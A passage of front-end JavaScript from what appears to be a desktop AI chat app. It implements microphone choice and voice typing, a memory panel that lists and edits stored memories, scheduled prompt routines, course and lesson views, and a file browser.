    for (const lv of p.levels) pop.append(h("button", { class: "mi", onclick: async () => { closePopover(); await desk.cmd(id, { type: "set_thinking_level", level: lv }); p.thinking = lv; renderDock(); } },
      h("span", { class: "k" }, lv), lv === p.thinking ? h("span", { class: "chk" }, "✓") : null));
  });
});

// ---------- microphone choice (Settings → Microphone, or right-click the mic button) ----------
// The chosen input is remembered by id and label: ids can change after a reconnect, labels usually don't.
const MIC = { get id() { return localStorage.micId || ""; }, get label() { return localStorage.micLabel || ""; } };
async function micDevices() {
  try { return (await navigator.mediaDevices.enumerateDevices()).filter((d) => d.kind === "audioinput" && d.deviceId !== "default" && d.deviceId !== "communications"); }
  catch { return []; }
}
function setMic(d) {
  if (d) { localStorage.micId = d.deviceId; localStorage.micLabel = d.label; } else { delete localStorage.micId; delete localStorage.micLabel; }
}
async function openMic() {
  const base = { echoCancellation: true, noiseSuppression: true, autoGainControl: true, channelCount: 1 };
  if (MIC.id) {
    const devs = await micDevices();
    const d = devs.find((x) => x.deviceId === MIC.id) || (MIC.label && devs.find((x) => x.label === MIC.label));
    if (d) { if (d.deviceId !== MIC.id) setMic(d); return navigator.mediaDevices.getUserMedia({ audio: { ...base, deviceId: { exact: d.deviceId } } }); }
    if (devs.length && devs.every((x) => x.label)) toast(`${MIC.label || "Your chosen mic"} isn't connected; using the system default.`, "warning");
  }
  // System default: if macOS has picked an iPhone (Continuity) mic, use the Mac's own mic instead. Choose the iPhone
  // explicitly in Settings → Microphone if you want it.
  const devs = await micDevices(), def = (await navigator.mediaDevices.enumerateDevices()).find((d) => d.kind === "audioinput" && d.deviceId === "default");
  if (def && /iphone|ipad/i.test(def.label)) {
    const own = devs.find((d) => !/iphone|ipad/i.test(d.label) && /macbook|built-in|internal/i.test(d.label)) || devs.find((d) => !/iphone|ipad/i.test(d.label));
    if (own) return navigator.mediaDevices.getUserMedia({ audio: { ...base, deviceId: { exact: own.deviceId } } });
  }
  return navigator.mediaDevices.getUserMedia({ audio: base });
}
// Live input level for a picker: returns a stop function.
async function micMeter(bar) {
  let stream, ctx, raf;
  try { stream = await openMic(); } catch (err) { bar.parentElement.title = "Mic unavailable: " + err.message; return () => {}; }
  ctx = new AudioContext();
  const an = ctx.createAnalyser(); an.fftSize = 512; ctx.createMediaStreamSource(stream).connect(an);
  const buf = new Uint8Array(an.fftSize);
  const loop = () => {
    if (!bar.isConnected) return stop();
    an.getByteTimeDomainData(buf);
    let peak = 0; for (const v of buf) peak = Math.max(peak, Math.abs(v - 128));
    bar.style.width = Math.min(100, (peak / 128) * 160) + "%";
    raf = requestAnimationFrame(loop);
  };
  const stop = () => { cancelAnimationFrame(raf); stream.getTracks().forEach((t) => t.stop()); ctx.close().catch(() => {}); };
  loop();
  return stop;
}
async function micMenu(anchor) {
  if (!(await desk.micPermission())) return toast("Microphone access is off. Enable it in System Settings → Privacy → Microphone.", "error");
  // Labels are hidden until the page has opened a mic once.
  let devs = await micDevices();
  if (devs.some((d) => !d.label)) { try { (await navigator.mediaDevices.getUserMedia({ audio: true })).getTracks().forEach((t) => t.stop()); devs = await micDevices(); } catch {} }
  popover(anchor, (pop) => {
    const item = (label, on, fn) => h("button", { class: "mi", onclick: () => { closePopover(); fn(); } }, h("span", { class: "k" }, label), on ? h("span", { class: "chk" }, "✓") : null);
    pop.append(h("div", { class: "mhd" }, "Microphone"),
      item("System default", !MIC.id, () => { setMic(null); toast("Mic: system default"); }),
      ...devs.map((d) => item(d.label || "Unnamed mic", MIC.id === d.deviceId, () => { setMic(d); toast("Mic: " + d.label); })),
      h("div", { class: "msep" }),
      h("button", { class: "mi", onclick: () => { closePopover(); openSettings(); } }, h("span", { class: "k" }, "Mic settings & level test…")));
  });
}

// ---------- voice typing (local whisper.cpp via main process) ----------
const V = { rec: null, chunks: [], t0: 0, timer: 0 };
async function toggleVoice() {
  if (V.rec) return V.rec.stop();
  if (!(await desk.micPermission())) return toast("Microphone access is off. Enable it in System Settings → Privacy → Microphone.", "error");
  let stream;
  try { stream = await openMic(); }
  catch (err) { return toast("Mic unavailable: " + err.message, "error"); }
  V.chunks = []; V.t0 = Date.now();
  V.rec = new MediaRecorder(stream, { mimeType: "audio/webm;codecs=opus" });
  V.rec.ondataavailable = (e) => e.data.size && V.chunks.push(e.data);
  V.rec.onstop = async () => {
    stream.getTracks().forEach((t) => t.stop());
    clearInterval(V.timer); V.rec = null;
    $("#micBtn").classList.remove("on"); $("#composer").classList.remove("recording");
    if (Date.now() - V.t0 < 400) return ($("#voiceState").textContent = "");
    $("#voiceState").textContent = "Transcribing…";
    const buf = await new Blob(V.chunks, { type: "audio/webm" }).arrayBuffer();
    const r = await desk.transcribe(new Uint8Array(buf), input.value.slice(0, input.selectionStart ?? input.value.length));
    $("#voiceState").textContent = "";
    if (r.error) return toast(/ENOENT/.test(r.error) ? "Voice typing needs whisper.cpp and ffmpeg: brew install whisper-cpp ffmpeg (npm run doctor checks it)."
      : /no such file|failed to (open|load) model|model file/i.test(r.error) ? "Voice typing has no model yet. See whisperModel in the README (npm run doctor checks it)."
      : "Transcription failed: " + r.error, "error");
    if (!r.text) return;
    const s = input.selectionStart ?? input.value.length, before = input.value.slice(0, s), after = input.value.slice(input.selectionEnd ?? s);
    const spacer = before && !/\s$/.test(before) ? " " : "";
    input.value = before + spacer + r.text + after;
    input.focus(); input.selectionStart = input.selectionEnd = (before + spacer + r.text).length;
    autosize();
  };
  desk.voiceWarm?.(); // Whisper loads while you talk
  V.rec.start(250);
  $("#micBtn").classList.add("on"); $("#composer").classList.add("recording");
  const tick = () => { const s = Math.floor((Date.now() - V.t0) / 1000); $("#voiceState").replaceChildren(h("span", { class: "rec" }), `${Math.floor(s / 60)}:${String(s % 60).padStart(2, "0")}`); };
  tick(); V.timer = setInterval(tick, 500);
}
$("#micBtn").addEventListener("click", toggleVoice);
$("#micBtn").addEventListener("contextmenu", (e) => { e.preventDefault(); micMenu(e.currentTarget); });

// ---------- side panel ----------
function panelTabs(ch) {
  const tabs = ch.panel === "learning" ? ["Course", "Lesson", "Tasks", "Memory", "Profile", "Files"] : ["Tasks", "Memory", "Files"];
  return S.memory ? tabs : tabs.filter((t) => t !== "Memory"); // Memory only when config.memory is set
}
function openPanel(tab) { S.panelOpen = true; localStorage["panel:" + S.active] = "1"; if (tab) S.panelTab = tab[0].toUpperCase() + tab.slice(1); renderPanel(); renderCrumb(); }
function togglePanel() { S.panelOpen = !S.panelOpen; localStorage["panel:" + S.active] = S.panelOpen ? "1" : "0"; renderPanel(); renderCrumb(); }
$("#panelToggle").addEventListener("click", togglePanel);

function renderPanel() {
  const ch = C(), panel = $("#panel");
  panel.hidden = !S.panelOpen;
  if (!S.panelOpen) return;
  const tabs = panelTabs(ch);
  if (!tabs.includes(S.panelTab)) S.panelTab = tabs[0];
  $("#panelTabs").replaceChildren(...tabs.map((t) => h("button", { "data-fast": true, class: t === S.panelTab ? "on" : "", onclick: () => { S.panelTab = t; renderPanel(); } }, t,
    t === "Tasks" && tasksFor(ch.id).some((x) => x.running) ? h("span", { class: "tab-dot" }) : null)));
  const body = $("#panelBody");
  body.classList.toggle("flush", S.panelTab === "Lesson" || (S.panelTab === "Files" && S.filePreview));
  panel.classList.toggle("wide", S.panelTab === "Lesson");
  if (S.panelTab === "Course") renderCourse(body);
  else if (S.panelTab === "Lesson") renderLesson(body);
  else if (S.panelTab === "Tasks") renderTasks(body);
  else if (S.panelTab === "Memory") renderMemory(body);
  else if (S.panelTab === "Profile") renderProfile(body);
  else renderFiles(body);
}
const ask = (txt) => { input.value = txt; send(); };
const ago = (ms) => { const s = Math.round((Date.now() - ms) / 1000), f = (n, u) => `${n}${u}`; return s < 60 ? "just now" : s < 3600 ? f(Math.round(s / 60), "m ago") : s < 86400 ? f(Math.round(s / 3600), "h ago") : f(Math.round(s / 86400), "d ago"); };
const until = (ms) => { const s = Math.max(0, Math.round((ms - Date.now()) / 1000)); return s < 60 ? "in <1m" : s < 3600 ? `in ${Math.round(s / 60)}m` : s < 86400 ? `in ${Math.round(s / 3600)}h` : `in ${Math.round(s / 86400)}d`; };

// ----- Course: the teach-skill workspace, drawn as a course map -----
async function refreshTopics() {
  const ch = C(); if (ch?.panel !== "learning") return;
  S.topics = await desk.topics(ch.learningRoot);
  if (S.panelOpen && S.panelTab === "Course") renderPanel();
}
async function renderCourse(body) {
  const ch = C();
  if (!S.topics) S.topics = await desk.topics(ch.learningRoot);
  if (S.courseTopic) return renderCourseDetail(body, await desk.topic(S.courseTopic));
  const { topics } = S.topics;
  const courses = topics.filter((t) => !t.legacy), notes = topics.filter((t) => t.legacy);
  const lessons = topics.reduce((n, t) => n + t.lessons.length, 0), records = topics.reduce((n, t) => n + t.records, 0);
  const card = (t) => h("button", { class: "course-card", onclick: () => { S.courseTopic = t.path; renderPanel(); } },
    h("div", { class: "cc-top" }, h("span", { class: "nm" }, t.name), h("span", { class: "chev" }, "›")),
    t.mission ? h("div", { class: "ms" }, t.mission.slice(0, 140)) : null,
    h("div", { class: "bar" }, h("i", { style: `width:${Math.min(100, t.lessons.length * 10)}%` })),
    h("div", { class: "ct" }, `${t.lessons.length} lessons · ${t.records} things you hold`));
  body.replaceChildren(
    h("div", { class: "p-intro" }, avatar(ch, 40, 11), h("div", {}, h("div", { class: "big" }, `${ch.name}'s classroom`), h("div", { class: "sub" }, `${courses.length} courses · ${lessons} lessons · ${records} records`))),
    h("div", { class: "sec" }, "Courses"),
    ...courses.map(card),
    courses.length ? null : h("div", { class: "empty-card" }, h("div", {}, "No course yet."), h("div", { class: "sub" }, `${ch.name} builds one per topic: a mission, a source list, short lessons and practice.`),
      h("button", { class: "btn primary", onclick: () => ask("I want to start learning a new topic.") }, "Start a course")),
    notes.length ? h("div", { class: "sec" }, "Your notes (no course yet)") : null,
    ...notes.map((t) => h("div", { class: "note-row" }, h("span", { class: "nm" }, t.name),
      h("button", { onclick: () => ask(`Turn my ${t.name} notes (${t.path.replace(S.home, "~")}) into a proper course: interview me for the mission first.`) }, "Make a course"),
      h("button", { onclick: () => desk.reveal(t.path) }, "Reveal"))));
}
function renderCourseDetail(body, d) {
  const ch = C();
  const next = () => ask(`Teach me the next lesson in the ${d.name} course.`);
  const missionTxt = d.mission.replace(/^#.*$/m, "").trim();
  body.replaceChildren(
    h("button", { class: "back", onclick: () => { S.courseTopic = null; renderPanel(); } }, "← All courses"),
    h("div", { class: "course-hero" }, h("div", { class: "kicker" }, "Course"), h("div", { class: "title" }, d.name),
      missionTxt ? md(missionTxt.length > 420 ? missionTxt.slice(0, 420) + "…" : missionTxt) : h("div", { class: "sub" }, "No mission yet."),
      h("div", { class: "acts" }, h("button", { class: "go", onclick: next }, "Next lesson"), h("button", { onclick: () => ask(`Quiz me on the ${d.name} course (retrieval practice).`) }, "Practice"),
        h("button", { onclick: () => ask(`Probe what I know about ${d.name}.`) }, "Probe me"))),
    h("div", { class: "stat-row" },
      h("div", { class: "stat" }, h("b", {}, d.lessons.length), h("span", {}, "lessons")),
      h("div", { class: "stat" }, h("b", {}, d.records.length), h("span", {}, "you hold")),
      h("div", { class: "stat" }, h("b", {}, d.resources), h("span", {}, "sources"))),
    h("div", { class: "sec" }, "Roadmap"),
    h("div", { class: "roadmap" },
      ...d.lessons.map((l, i) => h("button", { class: "node done", onclick: () => { openPanel("lesson"); showLesson(l.path); } },
        h("span", { class: "dot" }, i + 1), h("span", { class: "t" }, l.title), h("span", { class: "when" }, ago(l.mtime)))),
      h("button", { class: "node next", onclick: next }, h("span", { class: "dot" }, d.lessons.length + 1), h("span", { class: "t" }, "Next lesson"), h("span", { class: "when" }, "start →"))),
    d.records.length ? h("div", { class: "sec" }, "What you hold") : null,
    ...d.records.slice().reverse().map((r) => h("button", { class: "record", onclick: () => openFile(r.path) }, h("span", { class: "ck" }, "✓"), h("span", { class: "t" }, r.title), h("span", { class: "when" }, ago(r.mtime)))),
    d.reference.length ? h("div", { class: "sec" }, "Cheat sheets") : null,
    d.reference.length ? h("div", { class: "chips left" }, d.reference.map((r) => h("button", { class: "chip", onclick: () => { openPanel("lesson"); showLesson(r.path); } }, r.title))) : null,
    h("div", { class: "chips left", style: "margin-top:14px" },
      ["MISSION.md", "RESOURCES.md", "GLOSSARY.md", "NOTES.md"].map((f) => h("button", { class: "chip", onclick: () => openFile(d.path + "/" + f) }, f)),
      h("button", { class: "chip", onclick: () => desk.reveal(d.path) }, "Reveal folder")));
}


// ----- Memory: what this character (and every character) remembers about you, via Hindsight -----
const memTag = (id) => `harness:${id.replace(/-fast$/, "")}`;
// Optional Hindsight mental models: "profile-user" (who you are) and, per character, "memoryProfile" in its character file.
const KIND = { world: "fact", experience: "event", observation: "insight" };
async function loadMemories(more = false) {
  const m = S.mem, ch = C();
  const qs = new URLSearchParams({ limit: "40", offset: String(more ? m.items.length : 0), state: "valid" });
  if (m.scope === "harness") qs.set("tags", memTag(ch.id));
  if (m.q.trim()) qs.set("q", m.q.trim());
  const r = await desk.mem("GET", "/memories/list?" + qs.toString());
  if (r.error) { m.error = r.error; m.items = []; return; }
  m.error = null; m.total = r.total;
  m.items = more ? [...m.items, ...r.items] : r.items;
}
async function renderMemory(body) {
  const ch = C();
  if (!S.mem) {
    S.mem = { scope: "harness", q: "", items: [], total: 0, loading: true, profiles: [] };
    body.replaceChildren(h("div", { class: "blank" }, "Loading memory…"));
    const [stats, ...profiles] = await Promise.all([desk.mem("GET", "/stats"), desk.mem("GET", "/mental-models/profile-user"),
      ch.memoryProfile ? desk.mem("GET", `/mental-models/${ch.memoryProfile}`) : null]);
    Object.assign(S.mem, { stats, profiles: profiles.filter((p) => p && !p.error) });
    await loadMemories();
    S.mem.loading = false;
    if (S.panelTab !== "Memory" || C() !== ch) return;
  }
  const m = S.mem;
  if (m.stats?.error) {
    return body.replaceChildren(h("div", { class: "empty-card" }, h("div", {}, "Memory is offline."),
      h("div", { class: "sub" }, "The Hindsight server at memory.url isn't reachable. Start it, then try again."),
      h("button", { class: "btn", onclick: () => { S.mem = null; renderPanel(); } }, "Try again")));
  }
  const st = m.stats || {};
  const learning = (st.operations_by_status?.pending || 0) + (st.operations_by_status?.processing || 0);
  const profileCard = (p) => h("div", { class: "mem-profile" },
    h("div", { class: "mp-hd" }, h("span", { class: "nm" }, p.id === "profile-user" ? "Who you are" : `What ${ch.name} knows`),
      h("span", { class: "when" }, p.content ? `updated ${ago(Date.parse(p.last_refreshed_at))}` : "building…"),
      h("button", { class: "link", onclick: async (e) => { e.target.textContent = "Refreshing…"; const r = await desk.mem("POST", `/mental-models/${p.id}/refresh`); toast(r.error ? r.error : "Refreshing in the background; check back in a minute.", r.error ? "error" : "info"); } }, "Refresh")),
    p.content ? h("div", { class: "mp-body" }, md(p.content)) : h("div", { class: "sub" }, "Builds from your chats; the first version appears once the backlog of past chats is processed."));
  const say = h("input", { placeholder: `Tell ${ch.name} something to remember…`, spellcheck: "true" });
  const remember = async () => {
    const fact = say.value.trim(); if (!fact) return;
    say.value = ""; say.placeholder = "Saving…"; say.disabled = true;
    // Queued: returns at once. Processed within seconds, or a few minutes while past chats are still being learned.
    const r = await desk.mem("POST", "/memories", { async: true, items: [{ content: `${S.user} asked ${ch.name} to remember: ${fact}`, context: "explicit memory", timestamp: new Date().toISOString(), document_id: `told:${Date.now().toString(36)}`, tags: [memTag(ch.id), "source:told"] }] });
    say.disabled = false; say.placeholder = `Tell ${ch.name} something to remember…`;
    const busy = (S.mem.stats?.operations_by_status?.pending || 0) > 5;
    toast(r.error ? r.error : `${ch.name} will remember that${busy ? " (it shows up here in a few minutes; still learning from past chats)" : "."}`, r.error ? "error" : "info");
  };
  say.addEventListener("keydown", (e) => { if (e.key === "Enter") remember(); });
  const search = h("input", { class: "mem-search", placeholder: "Search memories", value: m.q, spellcheck: "false" });
  let t; search.addEventListener("input", () => { clearTimeout(t); t = setTimeout(async () => { m.q = search.value; await loadMemories(); renderPanel(); setTimeout(() => { const el = $(".mem-search"); el?.focus(); el?.setSelectionRange(el.value.length, el.value.length); }, 0); }, 300); });
  const scopeBtn = (v, label) => h("button", { class: m.scope === v ? "on" : "", onclick: async () => { m.scope = v; await loadMemories(); renderPanel(); } }, label);
  const row = (it) => {
    const [main, ...meta] = String(it.text || "").split(" | ");
    const src = (it.tags || []).find((x) => x.startsWith("source:"))?.slice(7);
    const when = it.mentioned_at || it.date;
    if (m.editing === it.id) {
      const ta = h("textarea", { rows: 3 }); ta.value = main;
      const save = async () => {
        const r = await desk.mem("PATCH", `/memories/${it.id}`, { text: [ta.value.trim(), ...meta].join(" | ") });
        if (r.error) return toast(r.error, "error");
        m.editing = null; await loadMemories(); renderPanel(); toast("Memory updated");
      };
      return h("div", { class: "mem-row editing" }, ta, h("div", { class: "row" }, h("button", { class: "btn", onclick: () => { m.editing = null; renderPanel(); } }, "Cancel"), h("button", { class: "btn primary", onclick: save }, "Save")));
    }
    return h("div", { class: "mem-row" },
      h("div", { class: "mt" }, main),
      meta.length ? h("div", { class: "mm" }, meta.join(" · ")) : null,
      h("div", { class: "mf" }, h("span", { class: "kind k-" + (it.fact_type || "world") }, KIND[it.fact_type] || "fact"), src ? h("span", {}, src === "told" ? "you told it" : src === "backfill" ? "from past chats" : "from a chat") : null,
        when ? h("span", {}, ago(Date.parse(when))) : null,
        h("span", { class: "acts" },
          h("button", { onclick: () => { m.editing = it.id; renderPanel(); } }, "Edit"),
          h("button", { class: "danger", onclick: async () => {
            const r = await desk.mem("PATCH", `/memories/${it.id}`, { state: "invalidated", reason: "Removed in Pi Desktop" });
            if (r.error) return toast(r.error, "error");
            m.items = m.items.filter((x) => x.id !== it.id); m.total--; renderPanel();
            toast("Memory removed", "info", { label: "Undo", fn: async () => { await desk.mem("PATCH", `/memories/${it.id}`, { state: "valid" }); await loadMemories(); renderPanel(); } });
          } }, "Remove"))));
  };
  const profiles = [...m.profiles].sort((a, b) => (a.id === "profile-user") - (b.id === "profile-user")); // this character's profile first
  body.replaceChildren(
    h("div", { class: "tasks-hd" }, h("div", {}, h("div", { class: "big" }, "Memory"),
      h("div", { class: "sub" }, `${(st.total_nodes || 0).toLocaleString()} memories from ${(st.total_documents || 0).toLocaleString()} conversations` + (learning ? ` · learning from ${learning} more in the background` : "")),
      S.memory?.explorer ? h("div", { class: "via" }, h("a", { href: `${S.memory.explorer.replace(/\/$/, "")}/banks/${encodeURIComponent(S.memory.bank)}` }, "Open memory explorer"), " · graph, entities, profiles") : null)),
    ...profiles.map(profileCard),
    h("div", { class: "mem-say" }, say, h("button", { class: "btn primary", onclick: remember }, "Remember")),
    h("div", { class: "mem-controls" }, h("div", { class: "seg" }, scopeBtn("harness", `With ${ch.name}`), scopeBtn("all", "Everything")), search),
    m.error ? h("div", { class: "err" }, m.error) : null,
    ...m.items.map(row),
    !m.items.length && !m.error ? h("div", { class: "blank" }, m.q ? "Nothing matches." : `No memories with ${ch.name} yet. They build up as you chat.`) : null,
    m.items.length < m.total ? h("button", { class: "btn more", onclick: async () => { await loadMemories(true); renderPanel(); } }, `Show more (${m.total - m.items.length} left)`) : null);
}


// ----- Tasks: scheduled prompts per character -----
S.tasks = [];
const tasksFor = (id) => S.tasks.filter((t) => t.character === id);
const DAYS = ["Sunday", "Monday", "Tuesday", "Wednesday", "Thursday", "Friday", "Saturday"];
function scheduleText(sc = {}) {
  if (sc.kind === "hourly") return `Every ${sc.every || 1} hour${(sc.every || 1) > 1 ? "s" : ""}`;
  if (sc.kind === "weekdays") return `Weekdays at ${sc.time}`;
  if (sc.kind === "weekly") return `Every ${DAYS[sc.day ?? 1]} at ${sc.time}`;
  return `Every day at ${sc.time}`;
}
async function loadTasks() { S.tasks = await desk.tasks(); }
desk.onTasks((list) => { S.tasks = list; if (S.panelOpen && S.panelTab === "Tasks") renderPanel(); });
desk.onOpenTask(async ({ character, id }) => { await selectCharacter(character); S.taskOpen = id; openPanel("tasks"); });

function taskForm(t) {
  const sc = t.schedule || { kind: "daily", time: "09:00" };
  const name = h("input", { placeholder: "Name, e.g. Morning ideas", value: t.name || "" });
  const prompt = h("textarea", { rows: 4, placeholder: `What should ${C().name} do each time? It runs on its own, so ask for a result you can read later.` });
  prompt.value = t.prompt || "";
  const kind = h("select", {}, [["daily", "Every day"], ["weekdays", "Weekdays"], ["weekly", "Every week"], ["hourly", "Every N hours"]].map(([v, l]) => h("option", { value: v, selected: sc.kind === v }, l)));
  const time = h("input", { type: "time", value: sc.time || "09:00" });
  const day = h("select", {}, DAYS.map((d, i) => h("option", { value: i, selected: (sc.day ?? 1) === i }, d)));
  const every = h("input", { type: "number", min: 1, max: 24, value: sc.every || 4, style: "width:70px" });
  const row = h("div", { class: "sched" });
  const sync = () => row.replaceChildren(kind, kind.value === "hourly" ? [every, h("span", {}, "hours")] : [kind.value === "weekly" ? day : null, h("span", {}, "at"), time]);
  kind.addEventListener("change", sync); sync();
  const save = async () => {
    if (!name.value.trim() || !prompt.value.trim()) return toast("Give the task a name and a prompt.", "warning");
    await desk.saveTask({ ...t, character: S.active, name: name.value.trim(), prompt: prompt.value.trim(), enabled: t.enabled ?? true,
      schedule: kind.value === "hourly" ? { kind: "hourly", every: +every.value || 1 } : { kind: kind.value, time: time.value || "09:00", day: +day.value } });
    S.taskForm = null; await loadTasks(); renderPanel();
  };
  return h("div", { class: "task-form" }, name, prompt, row,
    h("div", { class: "row" }, h("button", { class: "btn", onclick: () => { S.taskForm = null; renderPanel(); } }, "Cancel"), h("button", { class: "btn primary", onclick: save }, t.id ? "Save" : "Add task")));
}
const RHYTHM = { daily: ["☀️", "Daily"], weekdays: ["💼", "Weekdays"], weekly: ["📅", "Weekly"], hourly: ["⏱️", "Hourly"] };
const shortWhen = (sc = {}) => sc.kind === "hourly" ? `every ${sc.every || 1}h` : sc.kind === "weekly" ? `${DAYS[sc.day ?? 1].slice(0, 3)} ${sc.time}` : sc.time;
// Days in a row (ending today or yesterday) with at least one completed run.
function dayStreak(runs) {
  const days = new Set(runs.filter((r) => r.ok).map((r) => new Date(r.at).toDateString()));
  let d = new Date(), n = 0;
  if (!days.has(d.toDateString())) d.setDate(d.getDate() - 1);
  while (days.has(d.toDateString())) { n++; d.setDate(d.getDate() - 1); }
  return n;
}
function renderTasks(body) {
  const ch = C(), list = tasksFor(ch.id);
  const templates = (ch.taskTemplates || []).filter((tp) => !list.some((t) => t.name === tp.name));
  const allRuns = list.flatMap((t) => t.runs || []);
  const next = list.filter((t) => t.enabled && t.nextRunAt).map((t) => t.nextRunAt).sort((a, b) => a - b)[0];
  const card = (t) => {
    const runs = t.runs || [], last = runs[0], open = S.taskOpen === t.id;
    const [icon, label] = RHYTHM[t.schedule?.kind] || RHYTHM.daily;
    const toggle = h("button", { class: "switch" + (t.enabled ? " on" : ""), title: t.enabled ? "On" : "Paused", onclick: async (e) => { e.stopPropagation(); await desk.saveTask({ ...t, enabled: !t.enabled }); await loadTasks(); renderPanel(); } }, h("i"));
    const play = t.running
      ? h("button", { class: "play live", title: "Stop", onclick: (e) => { e.stopPropagation(); desk.stopTask(t.id); } }, h("span", { class: "spin-dot" }))
      : h("button", { class: "play", title: "Run now", onclick: (e) => { e.stopPropagation(); desk.runTask(t.id); } }, svg('<path d="M7 5l8 5-8 5z"/>'));
    const dots = runs.slice(0, 7).reverse().map((r) => h("i", { class: r.ok ? "ok" : "bad", title: `${r.ok ? "Done" : "Failed"} ${ago(r.at)}` }));
    let streak = 0; for (const r of runs) { if (!r.ok) break; streak++; }
    return h("div", { class: "quest" + (t.running ? " running" : "") + (t.enabled ? "" : " paused") + (open ? " open" : "") },
      h("div", { class: "q-row", onclick: () => { S.taskOpen = open ? null : t.id; renderPanel(); } },
        h("span", { class: "q-icon" }, icon),
        h("div", { class: "q-meta" }, h("div", { class: "nm" }, t.name),
          h("div", { class: "q-chips" }, h("span", { class: "chip-s" }, `${label} · ${shortWhen(t.schedule)}`),
            t.running ? h("span", { class: "chip-s live" }, `${ch.name} is on it…`)
              : t.enabled && t.nextRunAt ? h("span", { class: "chip-s soft" }, `next ${until(t.nextRunAt)}`) : !t.enabled ? h("span", { class: "chip-s soft" }, "paused") : null)),
        play, toggle),
      runs.length ? h("div", { class: "q-track" }, h("span", { class: "dots" }, dots), streak > 1 ? h("span", { class: "q-streak" }, `🔥 ${streak}`) : null,
        h("span", { class: "q-last" }, last.ok ? `done ${ago(last.at)}` : `failed ${ago(last.at)}`)) : null,
      open ? h("div", { class: "q-open" },
        last?.summary ? h("div", { class: "task-out" }, md(last.summary)) : h("div", { class: "sub" }, "No result yet. Press ▶ to run it now."),
        h("div", { class: "acts" },
          last?.session ? h("button", { class: "go", onclick: () => openSession(last.session) }, "Open chat") : null,
          h("button", { onclick: () => { S.taskForm = { ...t }; renderPanel(); } }, "Edit"),
          h("button", { class: "danger", onclick: async () => { if (await confirmModal({ title: `Delete “${t.name}”?`, body: "Its schedule stops. Past results stay in your chats.", confirm: "Delete", danger: true })) { await desk.deleteTask(t.id); await loadTasks(); renderPanel(); } } }, "Delete")),
        runs.length > 1 ? h("div", { class: "history" }, runs.slice(1, 8).map((r) => h("div", { class: "hrow" }, h("span", { class: r.ok ? "okc" : "badc" }, r.ok ? "✓" : "✗"),
          new Date(r.at).toLocaleString([], { weekday: "short", hour: "2-digit", minute: "2-digit" }), ` · ${Math.round(r.ms / 1000)}s`,
          r.session ? h("button", { onclick: () => openSession(r.session) }, "open") : null))) : null) : null);
  };
  body.replaceChildren(
    h("div", { class: "q-hd", title: `${ch.name} runs these on their own, even while you chat. Each result is saved as a chat.` },
      avatar(ch, 34, 10),
      h("div", { class: "q-title" }, h("div", { class: "big" }, "Routines"),
        h("span", { class: "q-pill soft" }, "Built-in scheduler")),
      S.taskForm ? null : h("button", { class: "add-round", title: "New routine", onclick: () => { S.taskForm = {}; renderPanel(); } }, "+")),
    list.length ? h("div", { class: "q-stats" },
      h("div", { class: "qs" }, h("b", {}, `🔥 ${dayStreak(allRuns)}`), h("span", {}, "day streak")),
      h("div", { class: "qs" }, h("b", {}, `✓ ${allRuns.filter((r) => r.ok).length}`), h("span", {}, "completed")),
      h("div", { class: "qs" }, h("b", {}, next ? until(next).replace("in ", "") : "—"), h("span", {}, "next run"))) : null,
    S.taskForm ? taskForm(S.taskForm) : null,
    ...list.map(card),
    !list.length && !S.taskForm ? h("div", { class: "empty-card" }, h("div", { style: "font-size:22px" }, "🎯"), h("div", {}, `Give ${ch.name} a routine`), h("div", { class: "sub" }, "A prompt that runs daily, weekly or every few hours.")) : null,
    templates.length && !S.taskForm ? h("div", { class: "sec" }, "Quick add") : null,
    templates.length && !S.taskForm ? h("div", { class: "q-ideas" }, templates.map((tp) => h("button", { class: "q-idea", onclick: () => { S.taskForm = { ...tp }; renderPanel(); } },
      h("span", {}, (RHYTHM[tp.schedule?.kind] || RHYTHM.daily)[0]), h("span", { class: "nm" }, tp.name), h("span", { class: "sub" }, shortWhen(tp.schedule))))) : null);
}
function showLesson(path) { S.lesson = path; if (S.panelTab === "Lesson") renderPanel(); }
function renderLesson(body) {
  if (!S.lesson) return body.replaceChildren(h("div", { class: "blank" }, `Lessons open here.\nWhen ${C().name} writes a new lesson, it appears automatically.`));
  body.replaceChildren(
    h("div", { class: "viewer-bar" }, h("span", { class: "nm" }, S.lesson.split("/").slice(-3).join(" / ")),
      h("button", { onclick: () => renderPanel() }, "Reload"), h("button", { onclick: () => openOut(S.lesson) }, "Open in browser"), h("button", { onclick: () => desk.reveal(S.lesson) }, "Reveal")),
    h("iframe", { class: "viewer", sandbox: "allow-scripts", src: "file://" + encodeURI(S.lesson) + "?t=" + Date.now() }));
}
async function renderProfile(body) {
  const root = (C().learningRoot || "~/learning").replace(/^~/, S.home);
  const txt = await desk.read(root + "/PROFILE.md");
  body.replaceChildren(txt ? md(txt) : h("div", { class: "blank" }, "No PROFILE.md yet."));
}

// Generic file browser rooted at the harness cwd; previews md/html/images/text inline.
async function renderFiles(body) {
  const ch = C();
  S.fsDir = S.fsDir && S.fsDir.startsWith(ch.cwd) ? S.fsDir : ch.cwd;
  if (S.filePreview) return renderPreview(body);
  const items = await desk.list(S.fsDir);
  const up = S.fsDir !== ch.cwd ? S.fsDir.split("/").slice(0, -1).join("/") : null;
  body.replaceChildren(
    h("div", { class: "fs-crumb" }, S.fsDir.replace(S.home, "~"), up ? [" · ", h("button", { onclick: () => { S.fsDir = up; renderPanel(); } }, "up")] : null),
    ...items.map((it) => h("button", { class: "fs-row", onclick: () => { if (it.dir) { S.fsDir = it.path; renderPanel(); } else openFile(it.path); } }, svg(it.dir ? ICON.folder : ICON.file), it.name)),
    items.length ? null : h("div", { class: "blank" }, "Empty folder"));
}
function openFile(p) {
  if (!p.startsWith("/")) p = (C().cwd + "/" + p).replace(/\/\.\//g, "/");
  p = p.replace(/^~/, S.home);
  if (C().panel === "learning" && /\/(lessons|reference)\/[^/]+\.html$/.test(p)) { openPanel("lesson"); return showLesson(p); }
  S.filePreview = p; openPanel("files");
}
const openOut = async (p) => { const r = await desk.open(p); if (r) toast(r, "warning"); };
async function renderPreview(body) {
  const p = S.filePreview, ext = (p.split(".").pop() || "").toLowerCase();
  // Same rule as every other file read: home folder or /tmp, never credential stores (safePath in main.js).
  if (!(await desk.allowed(p))) return body.replaceChildren(h("div", { class: "viewer-bar" }, h("button", { onclick: () => { S.filePreview = null; renderPanel(); } }, "← Files")),
    h("div", { class: "viewer-text" }, h("div", { class: "blank" }, "That file is outside what Pi Desktop may open (your home folder or /tmp, never keys or credentials).")));
  const bar = h("div", { class: "viewer-bar" }, h("button", { onclick: () => { S.filePreview = null; renderPanel(); } }, "← Files"), h("span", { class: "nm" }, p.replace(S.home, "~")),
